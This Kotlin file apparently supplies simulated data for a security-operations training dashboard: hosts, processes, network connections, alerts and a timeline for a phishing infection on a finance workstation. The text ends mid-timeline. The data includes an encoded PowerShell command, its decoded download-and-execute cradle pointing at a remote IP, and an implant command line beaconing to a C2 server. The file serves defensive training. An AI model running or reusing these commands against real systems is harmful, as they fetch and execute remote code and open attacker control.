package com.example.data

import com.example.model.*

object SimulatedThreatData {

    fun getInitialHosts(): List<Host> {
        return listOf(
            // Host 1: FIN-WS01 (Infected with active simulated threat)
            Host(
                id = "host-fin-ws01",
                hostname = "FIN-WS01",
                ipAddress = "10.0.10.45",
                macAddress = "00:50:56:A1:2B:3C",
                os = "Windows 11 Enterprise (23H2)",
                domain = "CORP.LOCAL",
                currentUser = "CORP\\fin_user01 (Alice Vance)",
                role = "Financial Operations & Wire Approvals",
                isIsolated = false,
                alertCount = 3,
                threatSeverity = ThreatSeverity.CRITICAL,
                description = "Primary finance workstation assigned to Senior Accountant. Handles sensitive quarterly ledger reports and banking portal logins.",
                processes = listOf(
                    ProcessItem(
                        pid = 4812,
                        name = "powershell.exe",
                        parentPid = 3104,
                        parentName = "explorer.exe",
                        user = "CORP\\fin_user01",
                        commandLine = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                        decodedCommandLine = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')",
                        path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        cpuUsage = "5.8%",
                        memoryUsage = "84.2 MB",
                        startTime = "13:04:22",
                        isSuspicious = true,
                        threatScore = "9.8 / 10 (CRITICAL)",
                        hash = "92E4774B8F77B0901A51B78D82F3B66D606E8813B11D46E9CDE5DFBA82BE27AA"
                    ),
                    ProcessItem(
                        pid = 5120,
                        name = "update_svc.exe",
                        parentPid = 4812,
                        parentName = "powershell.exe",
                        user = "CORP\\fin_user01",
                        commandLine = "C:\\Users\\fin_user01\\AppData\\Local\\Temp\\update_svc.exe --c2 185.220.101.5:443 --interval 30s --jitter 15",
                        decodedCommandLine = null,
                        path = "C:\\Users\\fin_user01\\AppData\\Local\\Temp\\update_svc.exe",
                        cpuUsage = "2.1%",
                        memoryUsage = "38.6 MB",
                        startTime = "13:05:01",
                        isSuspicious = true,
                        threatScore = "9.9 / 10 (MALICIOUS C2 BEACON)",
                        hash = "3FA29C17E8E04F1604B5089332D65B2B8599E05156F3BB8D1A39D9E123847F20"
                    ),
                    ProcessItem(
                        pid = 3104,
                        name = "explorer.exe",
                        parentPid = 1980,
                        parentName = "userinit.exe",
                        user = "CORP\\fin_user01",
                        commandLine = "C:\\Windows\\explorer.exe",
                        path = "C:\\Windows\\explorer.exe",
                        cpuUsage = "0.8%",
                        memoryUsage = "112.4 MB",
                        startTime = "08:15:00",
                        isSuspicious = false,
                        threatScore = "0.1 / 10 (NORMAL)",
                        hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"
                    ),
                    ProcessItem(
                        pid = 924,
                        name = "svchost.exe",
                        parentPid = 612,
                        parentName = "services.exe",
                        user = "NT AUTHORITY\\SYSTEM",
                        commandLine = "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
                        path = "C:\\Windows\\System32\\svchost.exe",
                        cpuUsage = "0.2%",
                        memoryUsage = "24.5 MB",
                        startTime = "08:00:12",
                        isSuspicious = false,
                        threatScore = "0.0 / 10 (SYSTEM)",
                        hash = "772C9E89D7F9B172A239DE164B8624EB076F5E3DCE7346A2BE9EE36F83BE9D54"
                    ),
                    ProcessItem(
                        pid = 2840,
                        name = "chrome.exe",
                        parentPid = 3104,
                        parentName = "explorer.exe",
                        user = "CORP\\fin_user01",
                        commandLine = "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=normal",
                        path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                        cpuUsage = "3.4%",
                        memoryUsage = "340.1 MB",
                        startTime = "08:20:15",
                        isSuspicious = false,
                        threatScore = "0.2 / 10 (BROWSER)",
                        hash = "84B6F7DC67EF1E4532B038B315001A832A895F379DF017EE975850DC3510A0A7"
                    ),
                    ProcessItem(
                        pid = 3950,
                        name = "excel.exe",
                        parentPid = 3104,
                        parentName = "explorer.exe",
                        user = "CORP\\fin_user01",
                        commandLine = "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
                        path = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                        cpuUsage = "1.1%",
                        memoryUsage = "195.0 MB",
                        startTime = "08:45:10",
                        isSuspicious = false,
                        threatScore = "0.0 / 10 (OFFICE)",
                        hash = "4D1B89AC772186C90818291412356BBA847250A195FE421060DEBA4628E619E2"
                    )
                ),
                networkConnections = listOf(
                    NetworkConnection(
                        id = "net-fin-001",
                        localAddress = "10.0.10.45",
                        localPort = 49821,
                        remoteAddress = "185.220.101.5",
                        remotePort = 443,
                        protocol = "TCP",
                        state = "ESTABLISHED",
                        processName = "update_svc.exe",
                        pid = 5120,
                        domainName = "evil-c2-cdn.cc",
                        geoIp = "Frankfurt, Germany (AS197071 / Bulletproof VPS)",
                        threatTag = "MALICIOUS C2 TRAFFIC",
                        isSuspicious = true,
                        timestamp = "13:05:03"
                    ),
                    NetworkConnection(
                        id = "net-fin-002",
                        localAddress = "10.0.10.45",
                        localPort = 49152,
                        remoteAddress = "10.0.0.10",
                        remotePort = 53,
                        protocol = "UDP",
                        state = "TRANSIENT",
                        processName = "svchost.exe",
                        pid = 924,
                        domainName = "evil-c2-cdn.cc",
                        geoIp = "Internal DNS Resolver (DC-01)",
                        threatTag = "SUSPICIOUS DNS QUERY",
                        isSuspicious = true,
                        timestamp = "13:04:59"
                    ),
                    NetworkConnection(
                        id = "net-fin-003",
                        localAddress = "10.0.10.45",
                        localPort = 445,
                        remoteAddress = "10.0.0.5",
                        remotePort = 445,
                        protocol = "TCP",
                        state = "ESTABLISHED",
                        processName = "System",
                        pid = 4,
                        domainName = "fs01.corp.local",
                        geoIp = "Internal File Server",
                        threatTag = "NORMAL SMB SHARE",
                        isSuspicious = false,
                        timestamp = "08:15:20"
                    ),
                    NetworkConnection(
                        id = "net-fin-004",
                        localAddress = "10.0.10.45",
                        localPort = 51220,
                        remoteAddress = "142.250.190.46",
                        remotePort = 443,
                        protocol = "TCP",
                        state = "ESTABLISHED",
                        processName = "chrome.exe",
                        pid = 2840,
                        domainName = "google.com",
                        geoIp = "Google LLC (United States)",
                        threatTag = "STANDARD HTTPS",
                        isSuspicious = false,
                        timestamp = "08:20:18"
                    )
                ),
                authEvents = listOf(
                    AuthEvent(
                        id = "auth-fin-001",
                        eventId = 4624,
                        eventName = "Successful Logon (Interactive)",
                        timestamp = "08:14:55",
                        username = "CORP\\fin_user01",
                        sourceIp = "127.0.0.1 (Console)",
                        logonType = "Type 2 (Interactive)",
                        status = "SUCCESS",
                        isSuspicious = false,
                        details = "User Alice Vance logged into console with smartcard credentials."
                    ),
                    AuthEvent(
                        id = "auth-fin-002",
                        eventId = 4672,
                        eventName = "Special Privileges Assigned",
                        timestamp = "08:14:55",
                        username = "CORP\\fin_user01",
                        sourceIp = "LOCAL",
                        logonType = "N/A",
                        status = "AUDIT",
                        isSuspicious = false,
                        details = "Assigned SeSecurityPrivilege, SeBackupPrivilege."
                    ),
                    AuthEvent(
                        id = "auth-fin-003",
                        eventId = 4688,
                        eventName = "New Process Created (Suspicious Encoded PowerShell)",
                        timestamp = "13:04:22",
                        username = "CORP\\fin_user01",
                        sourceIp = "10.0.10.45",
                        logonType = "Type 2",
                        status = "SECURITY ALERT",
                        isSuspicious = true,
                        details = "Process powershell.exe created with hidden window and base64 encoded arguments downloading payload from remote IP 185.220.101.5."
                    ),
                    AuthEvent(
                        id = "auth-fin-004",
                        eventId = 7045,
                        eventName = "New Windows Service Installed",
                        timestamp = "13:05:02",
                        username = "NT AUTHORITY\\SYSTEM",
                        sourceIp = "10.0.10.45",
                        logonType = "Type 0 (System)",
                        status = "SECURITY ALERT",
                        isSuspicious = true,
                        details = "Service 'UpdateSvcEngine' was created pointing to executable C:\\Users\\fin_user01\\AppData\\Local\\Temp\\update_svc.exe."
                    )
                ),
                fileArtifacts = listOf(
                    FileArtifact(
                        path = "C:\\Users\\fin_user01\\Downloads\\Invoice_Q3_9942.pdf.iso",
                        fileName = "Invoice_Q3_9942.pdf.iso",
                        size = "1.42 MB",
                        createdTime = "13:02:14",
                        modifiedTime = "13:02:14",
                        sha256 = "E84B1A0D6527C17EF901B64E2A74639B0182E47B342817290DAE23490715DCA1",
                        isSuspicious = true,
                        fileType = "Disk Image (.ISO) / Phishing Container",
                        threatNotes = "Contains malicious .LNK shortcut masquerading as PDF invoice with embedded powershell cradle."
                    ),
                    FileArtifact(
                        path = "C:\\Users\\fin_user01\\AppData\\Local\\Temp\\update_svc.exe",
                        fileName = "update_svc.exe",
                        size = "348 KB",
                        createdTime = "13:04:55",
                        modifiedTime = "13:04:55",
                        sha256 = "3FA29C17E8E04F1604B5089332D65B2B8599E05156F3BB8D1A39D9E123847F20",
                        isSuspicious = true,
                        fileType = "PE32+ Executable (Unsigned Backdoor)",
                        threatNotes = "Implant binary dropped by PowerShell script. Hardcoded C2 callback to 185.220.101.5:443."
                    ),
                    FileArtifact(
                        path = "C:\\Users\\fin_user01\\Documents\\Q3_Financial_Forecast.xlsx",
                        fileName = "Q3_Financial_Forecast.xlsx",
                        size = "2.1 MB",
                        createdTime = "09:12:00",
                        modifiedTime = "11:45:00",
                        sha256 = "8F0238C913AE77103299ACBF5620199182390192837482910394829102938472",
                        isSuspicious = false,
                        fileType = "Microsoft Excel Worksheet",
                        threatNotes = "Legitimate financial forecast document."
                    ),
                    FileArtifact(
                        path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        fileName = "powershell.exe",
                        size = "450 KB",
                        createdTime = "2023-11-14",
                        modifiedTime = "2023-11-14",
                        sha256 = "92E4774B8F77B0901A51B78D82F3B66D606E8813B11D46E9CDE5DFBA82BE27AA",
                        isSuspicious = false,
                        fileType = "System Executable (Signed by Microsoft)",
                        threatNotes = "Living-off-the-land system utility abused by attacker."
                    )
                )
            ),

            // Host 2: FIN-WS02 (Finance Workstation 02 - Normal)
            Host(
                id = "host-fin-ws02",
                hostname = "FIN-WS02",
                ipAddress = "10.0.10.46",
                macAddress = "00:50:56:A1:2B:3D",
                os = "Windows 11 Enterprise (23H2)",
                domain = "CORP.LOCAL",
                currentUser = "CORP\\fin_user02 (Bob Miller)",
                role = "Accounts Payable & Vendor Disbursals",
                isIsolated = false,
                alertCount = 0,
                threatSeverity = ThreatSeverity.CLEAN,
                description = "Finance workstation for vendor accounts payable and purchase order matching.",
                processes = listOf(
                    ProcessItem(
                        pid = 2108,
                        name = "explorer.exe",
                        parentPid = 1204,
                        parentName = "userinit.exe",
                        user = "CORP\\fin_user02",
                        commandLine = "C:\\Windows\\explorer.exe",
                        path = "C:\\Windows\\explorer.exe",
                        cpuUsage = "0.5%",
                        memoryUsage = "98.0 MB",
                        startTime = "08:30:00",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"
                    ),
                    ProcessItem(
                        pid = 4120,
                        name = "outlook.exe",
                        parentPid = 2108,
                        parentName = "explorer.exe",
                        user = "CORP\\fin_user02",
                        commandLine = "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
                        path = "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                        cpuUsage = "1.2%",
                        memoryUsage = "210.5 MB",
                        startTime = "08:32:10",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "A192B43C56D78E0F1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF"
                    ),
                    ProcessItem(
                        pid = 4580,
                        name = "excel.exe",
                        parentPid = 2108,
                        parentName = "explorer.exe",
                        user = "CORP\\fin_user02",
                        commandLine = "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
                        path = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                        cpuUsage = "0.9%",
                        memoryUsage = "180.2 MB",
                        startTime = "09:00:00",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "4D1B89AC772186C90818291412356BBA847250A195FE421060DEBA4628E619E2"
                    )
                ),
                networkConnections = listOf(
                    NetworkConnection(
                        id = "net-fin02-001",
                        localAddress = "10.0.10.46",
                        localPort = 52100,
                        remoteAddress = "52.96.166.130",
                        remotePort = 443,
                        protocol = "TCP",
                        state = "ESTABLISHED",
                        processName = "outlook.exe",
                        pid = 4120,
                        domainName = "outlook.office365.com",
                        geoIp = "Microsoft Corporation",
                        threatTag = "OFFICE 365 CLOUD",
                        isSuspicious = false,
                        timestamp = "08:32:15"
                    )
                ),
                authEvents = listOf(
                    AuthEvent(
                        id = "auth-fin02-001",
                        eventId = 4624,
                        eventName = "Successful Logon (Interactive)",
                        timestamp = "08:29:50",
                        username = "CORP\\fin_user02",
                        sourceIp = "127.0.0.1 (Console)",
                        logonType = "Type 2",
                        status = "SUCCESS",
                        isSuspicious = false,
                        details = "User Bob Miller logged in normally."
                    )
                ),
                fileArtifacts = listOf(
                    FileArtifact(
                        path = "C:\\Users\\fin_user02\\Documents\\Vendor_Invoices_August.xlsx",
                        fileName = "Vendor_Invoices_August.xlsx",
                        size = "1.8 MB",
                        createdTime = "09:05:00",
                        modifiedTime = "12:10:00",
                        sha256 = "C8A201948B019284729104928104829104829104829104829104829104829104",
                        isSuspicious = false,
                        fileType = "Excel Workbook",
                        threatNotes = "Legitimate internal spreadsheet."
                    )
                )
            ),

            // Host 3: HR-WS01 (HR Workstation 01)
            Host(
                id = "host-hr-ws01",
                hostname = "HR-WS01",
                ipAddress = "10.0.12.18",
                macAddress = "00:50:56:B2:3C:4D",
                os = "Windows 11 Pro (23H2)",
                domain = "CORP.LOCAL",
                currentUser = "CORP\\hr_recruiter (Sarah Jenkins)",
                role = "Talent Acquisition & Employee Records",
                isIsolated = false,
                alertCount = 0,
                threatSeverity = ThreatSeverity.CLEAN,
                description = "HR recruiting endpoint. Used for onboarding paperwork and applicant screening.",
                processes = listOf(
                    ProcessItem(
                        pid = 1890,
                        name = "explorer.exe",
                        parentPid = 1012,
                        parentName = "userinit.exe",
                        user = "CORP\\hr_recruiter",
                        commandLine = "C:\\Windows\\explorer.exe",
                        path = "C:\\Windows\\explorer.exe",
                        cpuUsage = "0.4%",
                        memoryUsage = "88.0 MB",
                        startTime = "08:05:00",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"
                    ),
                    ProcessItem(
                        pid = 3310,
                        name = "chrome.exe",
                        parentPid = 1890,
                        parentName = "explorer.exe",
                        user = "CORP\\hr_recruiter",
                        commandLine = "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
                        path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                        cpuUsage = "2.8%",
                        memoryUsage = "280.0 MB",
                        startTime = "08:10:00",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "84B6F7DC67EF1E4532B038B315001A832A895F379DF017EE975850DC3510A0A7"
                    )
                ),
                networkConnections = listOf(
                    NetworkConnection(
                        id = "net-hr-001",
                        localAddress = "10.0.12.18",
                        localPort = 53400,
                        remoteAddress = "199.16.156.38",
                        remotePort = 443,
                        protocol = "TCP",
                        state = "ESTABLISHED",
                        processName = "chrome.exe",
                        pid = 3310,
                        domainName = "workday.com",
                        geoIp = "Workday Inc. (United States)",
                        threatTag = "HR SAAS PORTAL",
                        isSuspicious = false,
                        timestamp = "08:12:00"
                    )
                ),
                authEvents = listOf(
                    AuthEvent(
                        id = "auth-hr-001",
                        eventId = 4624,
                        eventName = "Successful Logon",
                        timestamp = "08:04:40",
                        username = "CORP\\hr_recruiter",
                        sourceIp = "127.0.0.1",
                        logonType = "Type 2",
                        status = "SUCCESS",
                        isSuspicious = false,
                        details = "Recruiter Sarah Jenkins standard morning logon."
                    )
                ),
                fileArtifacts = listOf(
                    FileArtifact(
                        path = "C:\\Users\\hr_recruiter\\Downloads\\Candidate_Resume_Taylor.pdf",
                        fileName = "Candidate_Resume_Taylor.pdf",
                        size = "245 KB",
                        createdTime = "10:15:00",
                        modifiedTime = "10:15:00",
                        sha256 = "D910283746190283746192837461928374619283746192837461928374619283",
                        isSuspicious = false,
                        fileType = "Adobe Acrobat PDF Document",
                        threatNotes = "Scanned clean by SOC mail filter."
                    )
                )
            ),

            // Host 4: EXEC-WS01 (Executive Workstation 01)
            Host(
                id = "host-exec-ws01",
                hostname = "EXEC-WS01",
                ipAddress = "10.0.15.5",
                macAddress = "00:50:56:C3:4D:5E",
                os = "Windows 11 Enterprise (BitLocker Encrypted / EDR Active)",
                domain = "CORP.LOCAL",
                currentUser = "CORP\\ceo_exec (David Sterling)",
                role = "Executive Suite / Chief Executive Officer",
                isIsolated = false,
                alertCount = 0,
                threatSeverity = ThreatSeverity.CLEAN,
                description = "High-priority VIP endpoint. Protected with hardware TPM and heightened EDR behavioral telemetry.",
                processes = listOf(
                    ProcessItem(
                        pid = 1102,
                        name = "explorer.exe",
                        parentPid = 890,
                        parentName = "userinit.exe",
                        user = "CORP\\ceo_exec",
                        commandLine = "C:\\Windows\\explorer.exe",
                        path = "C:\\Windows\\explorer.exe",
                        cpuUsage = "0.3%",
                        memoryUsage = "105.0 MB",
                        startTime = "07:45:00",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855"
                    ),
                    ProcessItem(
                        pid = 2950,
                        name = "teams.exe",
                        parentPid = 1102,
                        parentName = "explorer.exe",
                        user = "CORP\\ceo_exec",
                        commandLine = "\"C:\\Users\\ceo_exec\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\"",
                        path = "C:\\Users\\ceo_exec\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
                        cpuUsage = "1.8%",
                        memoryUsage = "310.0 MB",
                        startTime = "07:50:00",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "B5A9102837461928374619283746192837461928374619283746192837461928"
                    )
                ),
                networkConnections = listOf(
                    NetworkConnection(
                        id = "net-exec-001",
                        localAddress = "10.0.15.5",
                        localPort = 55100,
                        remoteAddress = "52.114.132.84",
                        remotePort = 443,
                        protocol = "TCP",
                        state = "ESTABLISHED",
                        processName = "teams.exe",
                        pid = 2950,
                        domainName = "teams.microsoft.com",
                        geoIp = "Microsoft Corporation",
                        threatTag = "COLLABORATION AUDIO/VIDEO",
                        isSuspicious = false,
                        timestamp = "07:50:10"
                    )
                ),
                authEvents = listOf(
                    AuthEvent(
                        id = "auth-exec-001",
                        eventId = 4624,
                        eventName = "Successful Logon (YubiKey MFA)",
                        timestamp = "07:44:50",
                        username = "CORP\\ceo_exec",
                        sourceIp = "127.0.0.1",
                        logonType = "Type 2",
                        status = "SUCCESS",
                        isSuspicious = false,
                        details = "CEO David Sterling authenticated via FIDO2 hardware token."
                    )
                ),
                fileArtifacts = listOf(
                    FileArtifact(
                        path = "C:\\Users\\ceo_exec\\Documents\\Board_Meeting_Minutes_Confidential.docx",
                        fileName = "Board_Meeting_Minutes_Confidential.docx",
                        size = "950 KB",
                        createdTime = "08:15:00",
                        modifiedTime = "09:30:00",
                        sha256 = "1029384756102938475610293847561029384756102938475610293847561029",
                        isSuspicious = false,
                        fileType = "Microsoft Word Document",
                        threatNotes = "Encrypted with Azure Rights Management."
                    )
                )
            ),

            // Host 5: WEB-01 (DMZ Web Server 01 - Linux)
            Host(
                id = "host-web-01",
                hostname = "WEB-01",
                ipAddress = "192.168.100.12",
                macAddress = "00:50:56:D4:5E:6F",
                os = "Ubuntu Linux 22.04 LTS (Kernel 5.15.0-91-generic)",
                domain = "DMZ.CORP.LOCAL",
                currentUser = "www-data",
                role = "Public Web Gateway & Nginx Reverse Proxy",
                isIsolated = false,
                alertCount = 0,
                threatSeverity = ThreatSeverity.CLEAN,
                description = "External-facing DMZ server hosting corporate public portal with strict TLS 1.3 reverse proxy rules.",
                processes = listOf(
                    ProcessItem(
                        pid = 1,
                        name = "systemd",
                        parentPid = 0,
                        parentName = "kernel",
                        user = "root",
                        commandLine = "/sbin/init",
                        path = "/sbin/init",
                        cpuUsage = "0.0%",
                        memoryUsage = "14.2 MB",
                        startTime = "00:00:01",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "F1E2D3C4B5A69788192837465019283746501928374650192837465019283746"
                    ),
                    ProcessItem(
                        pid = 840,
                        name = "nginx: master",
                        parentPid = 1,
                        parentName = "systemd",
                        user = "root",
                        commandLine = "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;",
                        path = "/usr/sbin/nginx",
                        cpuUsage = "0.1%",
                        memoryUsage = "28.5 MB",
                        startTime = "00:00:15",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "A9B8C7D6E5F4031234567890ABCDEF1234567890ABCDEF1234567890ABCDEF12"
                    ),
                    ProcessItem(
                        pid = 841,
                        name = "nginx: worker",
                        parentPid = 840,
                        parentName = "nginx: master",
                        user = "www-data",
                        commandLine = "nginx: worker process",
                        path = "/usr/sbin/nginx",
                        cpuUsage = "1.5%",
                        memoryUsage = "45.0 MB",
                        startTime = "00:00:16",
                        isSuspicious = false,
                        threatScore = "0.0 / 10",
                        hash = "A9B8C7D6E5F4031234567890ABCDEF1234567890ABCDEF1234567890ABCDEF12"
                    )
                ),
                networkConnections = listOf(
                    NetworkConnection(
                        id = "net-web-001",
                        localAddress = "0.0.0.0",
                        localPort = 443,
                        remoteAddress = "0.0.0.0",
                        remotePort = 0,
                        protocol = "TCP",
                        state = "LISTEN",
                        processName = "nginx",
                        pid = 840,
                        domainName = "www.corporate-portal.com",
                        geoIp = "Public HTTPS Listener",
                        threatTag = "SECURE WEB SERVER",
                        isSuspicious = false,
                        timestamp = "00:00:15"
                    )
                ),
                authEvents = listOf(
                    AuthEvent(
                        id = "auth-web-001",
                        eventId = 1001,
                        eventName = "SSH Session Opened",
                        timestamp = "06:00:00",
                        username = "sysadmin_ops",
                        sourceIp = "10.0.0.50 (Bastion Host)",
                        logonType = "SSH Public Key",
                        status = "SUCCESS",
                        isSuspicious = false,
                        details = "Daily automated log backup pipeline connection."
                    )
                ),
                fileArtifacts = listOf(
                    FileArtifact(
                        path = "/etc/nginx/sites-available/corporate.conf",
                        fileName = "corporate.conf",
                        size = "3.2 KB",
                        createdTime = "2024-01-10",
                        modifiedTime = "2024-02-15",
                        sha256 = "6543210987654321098765432109876543210987654321098765432109876543",
                        isSuspicious = false,
                        fileType = "Nginx Configuration File",
                        threatNotes = "Standard production reverse proxy configuration."
                    )
                )
            ),

            // Host 6: DC-01 (Domain Controller 01)
            Host(
                id = "host-dc-01",
                hostname = "DC-01",
                ipAddress = "10.0.0.10",
                macAddress = "00:50:56:E5:6F:70",
                os = "Windows Server 2022 Datacenter",
                domain = "CORP.LOCAL",
                currentUser = "NT AUTHORITY\\SYSTEM",
                role = "Primary Domain Controller / Kerberos KDC & DNS",
                isIsolated = false,
                alertCount = 0,
                threatSeverity = ThreatSeverity.CLEAN,
                description = "Primary Active Directory domain controller and authoritative DNS resolver for CORP.LOCAL forest.",
                processes = listOf(
                    ProcessItem(
                        pid = 580,
                        name = "lsass.exe",
                        parentPid = 490,
                        parentName = "wininit.exe",
                        user = "NT AUTHORITY\\SYSTEM",
                        commandLine = "C:\\Windows\\system32\\lsass.exe",
                        path = "C:\\Windows\\System32\\lsass.exe",
                        cpuUsage = "0.4%",
                        memoryUsage = "165.0 MB",
                        startTime = "00:00:10",
                        isSuspicious = false,
                        threatScore = "0.0 / 10 (SYSTEM SECURITY AUTH)",
                        hash = "1A2B3C4D5E6F7081920394857610293847561029384756102938475610293847"
                    ),
                    ProcessItem(
                        pid = 1120,
                        name = "dns.exe",
                        parentPid = 612,
                        parentName = "services.exe",
                        user = "NT AUTHORITY\\SYSTEM",
                        commandLine = "C:\\Windows\\System32\\dns.exe",
                        path = "C:\\Windows\\System32\\dns.exe",
                        cpuUsage = "0.8%",
                        memoryUsage = "89.2 MB",
                        startTime = "00:00:12",
                        isSuspicious = false,
                        threatScore = "0.0 / 10 (INTERNAL DNS)",
                        hash = "2B3C4D5E6F708192039485761029384756102938475610293847561029384756"
                    )
                ),
                networkConnections = listOf(
                    NetworkConnection(
                        id = "net-dc-001",
                        localAddress = "10.0.0.10",
                        localPort = 88,
                        remoteAddress = "0.0.0.0",
                        remotePort = 0,
                        protocol = "TCP",
                        state = "LISTEN",
                        processName = "lsass.exe",
                        pid = 580,
                        domainName = "kdc.corp.local",
                        geoIp = "Kerberos KDC Listener",
                        threatTag = "AUTHENTICATION SERVICE",
                        isSuspicious = false,
                        timestamp = "00:00:10"
                    ),
                    NetworkConnection(
                        id = "net-dc-002",
                        localAddress = "10.0.0.10",
                        localPort = 53,
                        remoteAddress = "0.0.0.0",
                        remotePort = 0,
                        protocol = "UDP",
                        state = "LISTEN",
                        processName = "dns.exe",
                        pid = 1120,
                        domainName = "dns.corp.local",
                        geoIp = "Core DNS Listener",
                        threatTag = "NAME RESOLUTION",
                        isSuspicious = false,
                        timestamp = "00:00:12"
                    )
                ),
                authEvents = listOf(
                    AuthEvent(
                        id = "auth-dc-001",
                        eventId = 4768,
                        eventName = "A Kerberos authentication ticket (TGT) was requested",
                        timestamp = "13:04:20",
                        username = "fin_user01@CORP.LOCAL",
                        sourceIp = "10.0.10.45",
                        logonType = "Kerberos",
                        status = "SUCCESS",
                        isSuspicious = false,
                        details = "Ticket-Granting Ticket issued for client workstation FIN-WS01."
                    )
                ),
                fileArtifacts = listOf(
                    FileArtifact(
                        path = "C:\\Windows\\NTDS\\ntds.dit",
                        fileName = "ntds.dit",
                        size = "450 MB",
                        createdTime = "2023-01-01",
                        modifiedTime = "13:00:00",
                        sha256 = "8899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF0011223344556677",
                        isSuspicious = false,
                        fileType = "Active Directory Database",
                        threatNotes = "Protected Active Directory credential store."
                    )
                )
            )
        )
    }

    fun getInitialAlerts(): List<AlertItem> {
        return listOf(
            AlertItem(
                id = "ALERT-2026-9041",
                title = "Suspicious Obfuscated PowerShell Execution with Hidden Window",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                severity = ThreatSeverity.CRITICAL,
                category = "Execution / Defense Evasion",
                mitreTactic = "T1059.001 - Command and Scripting Interpreter: PowerShell",
                mitreTechniqueId = "T1059.001",
                description = "EDR telemetry detected powershell.exe executed with '-NoP -NonI -W Hidden -Enc' arguments by parent process explorer.exe. Decoded payload shows active webclient download of remote secondary payload.",
                timestamp = "13:04:22",
                isInvestigated = false,
                isBookmarkedEvidence = false,
                recommendation = "Inspect process lineage, identify parent executable and initial infection vector, isolate host FIN-WS01 to prevent lateral spread."
            ),
            AlertItem(
                id = "ALERT-2026-9042",
                title = "Active Command & Control (C2) Beaconing to Untrusted IP",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                severity = ThreatSeverity.HIGH,
                category = "Command and Control",
                mitreTactic = "T1071.001 - Application Layer Protocol: Web Protocols",
                mitreTechniqueId = "T1071.001",
                description = "Unsigned binary update_svc.exe (PID 5120) established persistent outbound HTTPS beaconing to remote bulletproof hosting IP 185.220.101.5 on port 443 with 30-second interval jitter.",
                timestamp = "13:05:03",
                isInvestigated = false,
                isBookmarkedEvidence = false,
                recommendation = "Isolate host from the local network, extract binary hash 3FA29C17... for IOC blocklist, and terminate process."
            ),
            AlertItem(
                id = "ALERT-2026-9043",
                title = "Unsigned Executable Staged in %TEMP% Directory",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                severity = ThreatSeverity.HIGH,
                category = "Persistence / Privilege Escalation",
                mitreTactic = "T1204.002 - User Execution: Malicious File",
                mitreTechniqueId = "T1204.002",
                description = "Binary update_svc.exe created in AppData\\Local\\Temp and registered as a Windows Service 'UpdateSvcEngine' to achieve persistence upon reboot.",
                timestamp = "13:05:02",
                isInvestigated = false,
                isBookmarkedEvidence = false,
                recommendation = "Collect forensic file artifact, inspect Windows Event 7045 in auth logs, and purge scheduled persistence."
            )
        )
    }

    fun getInitialTimelineEvents(): List<TimelineEvent> {
        return listOf(
            TimelineEvent(
                id = "time-001",
                timestamp = "13:02:14",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                source = "Mail Gateway & Browser",
                eventType = "File Drop / Phishing Delivery",
                severity = ThreatSeverity.MEDIUM,
                summary = "Phishing attachment 'Invoice_Q3_9942.pdf.iso' downloaded to user Downloads folder",
                details = "User fin_user01 clicked an email lure. The ISO container was mounted into virtual drive."
            ),
            TimelineEvent(
                id = "time-002",
                timestamp = "13:04:22",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                source = "EDR Behavioral Sensor",
                eventType = "Process Spawn (Execution)",
                severity = ThreatSeverity.CRITICAL,
                summary = "explorer.exe spawned hidden powershell.exe with base64 encoded payload",
                details = "Command executed: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAA... (Downloads remote script payload.ps1 from 185.220.101.5)"
            ),
            TimelineEvent(
                id = "time-003",
                timestamp = "13:04:59",
                hostId = "host-fin-ws01",
                hostname = "FIN-WS01",
                source = "DNS Sensor (DC-01)",
                eventType = "DNS Query",
                severity = ThreatSeverity.HIGH,
